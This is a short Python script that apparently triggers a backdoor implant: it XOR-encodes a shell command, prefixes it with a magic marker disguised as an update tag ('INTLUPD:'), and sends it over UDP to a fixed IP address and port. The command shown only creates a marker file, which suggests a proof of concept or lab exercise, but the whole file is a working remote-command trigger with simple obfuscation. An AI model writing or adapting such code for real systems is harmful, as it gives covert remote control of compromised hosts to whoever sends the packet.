import socket

MAGIC = b"INTLUPD:"
KEY = 0x55
CMD = "touch /tmp/hello_from_backdoor"

payload = MAGIC + bytes([b ^ KEY for b in CMD.encode()])
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(payload, ("17.17.1.204", 5555))